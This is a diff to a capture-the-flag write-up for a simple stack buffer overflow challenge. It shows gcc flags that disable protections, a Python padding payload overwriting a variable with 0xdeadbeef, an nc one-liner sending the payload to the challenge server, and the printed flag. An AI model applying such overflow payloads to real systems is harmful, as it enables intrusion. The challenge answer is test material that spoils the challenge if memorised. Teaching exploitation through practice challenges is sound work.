@@ -9,7 +9,7 @@ The sourcecode of the executable is given in the challenge, (buffer_overflow1.c)
 
 1. Analyzing code
 2. Compiling the code
-3. crafting our buffer overflow input
+3. Crafting our buffer overflow input
 
 ## 1. Analyzing code
 Looking at the sourcecode we notice that this is an easy buffer overflow example.
@@ -42,8 +42,9 @@ else {
 
 we also notice that in the `read` function it reads `0x100` bytes which is `256` bytes, however the variable `your_name` is only 100 bytes long. This means that the `read` function can lead to a buffer overflow vulnerability.
 
-## 2. compiling the code
+## 2. Compiling the code
 `gcc buffer_overflow1.c -o buffer_overflow1.exe -fno-stack-protector -z execstack -no-pie`
+
 we use `-fno-stack-protector -z execstack -no-pie` to ensure no stack protection is running so our exploit can run.
 
 ## 3. crafting our buffer overflow input
@@ -72,12 +73,12 @@ To craft our malformed input, we use python as follows:
 `print('A'*100+'\xef\xbe\xad\xde')`
 `>>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
 `
->note the special char at the end representing the hex value `0xdeadbeef`
+>note the special chars at the end representing the hex value `0xdeadbeef`
 
 By entering this value into the program, it gives the FLAG.
 
 # One line command:
 `python -c "print('A'*100+'\xef\xbe\xad\xde')" | nc pwnable.hackable.ca 9993`
 
-#FLAGL:
-FLAG{0v3rfl0w5_ar3_fun}
+#FLAG:
+```FLAG{0v3rfl0w5_ar3_fun}```
